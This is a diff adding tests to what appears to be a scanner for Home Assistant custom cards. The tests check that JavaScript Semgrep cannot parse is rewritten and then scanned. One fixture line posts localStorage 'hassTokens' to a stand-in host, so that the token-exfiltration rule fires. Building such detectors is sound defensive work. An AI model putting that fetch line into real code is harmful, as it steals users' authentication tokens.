@@ -125,6 +125,35 @@ def test_arrow_comment_idiom_does_not_hide_code(tmp_path):
     assert "card-html-comment-token" not in rules
 
 
+def test_normalize_js_rewrites_what_semgrep_misreads(tmp_path):
+    """0.10.2: `?.` before a digit is never optional chaining, and `new (as)(...)` builds
+    the same class as `new as(...)`. Optional chaining and other names are left alone."""
+    f = tmp_path / "c.js"
+    f.write_text("x=n?.5:1;y=a?.b?.[0];z=new as(t,-1);w=new  satisfies (1);v=new ask(1);u=q??.5\n")
+    assert normalize_js(tmp_path) == 1
+    assert f.read_text() == (
+        "x=n? .5:1;y=a?.b?.[0];z=new (as)(t,-1);w=new  (satisfies) (1);v=new ask(1);u=q?? .5\n"
+    )
+
+
+def test_a_file_semgrep_could_not_read_is_read_after_the_rewrite(tmp_path):
+    """HACS 2.0.5's chunk 1117 in two lines (see test_semgrep_filters): untouched, no rule
+    runs on it. In Barkley's copy the token line beside it is found and nothing is left
+    unparsed."""
+    card = tmp_path / "odd-card"
+    (card / "dist").mkdir(parents=True)
+    (card / "hacs.json").write_text('{"name": "Odd", "filename": "odd-card.js"}')
+    (card / "dist" / "odd-card.js").write_text(
+        "function m(t){ return new as(t, -1) }\n"
+        "function Us(n){ return n.map((t => function(t, e){ return t }(t, 1))) }\n"
+        "var x = n?.5:1;\n"
+        'fetch("https://collect.invalid/c",{method:"POST",body:localStorage.getItem("hassTokens")});\n'
+    )
+    rules = _rules(scan(str(card), offline=True))
+    assert "card-token-exfil" in rules
+    assert not {"scan-file-not-checked", "scan-parse-error"} & rules
+
+
 def test_unparseable_js_is_reported_not_silent(tmp_path):
     card = tmp_path / "odd-card"
     (card / "dist").mkdir(parents=True)
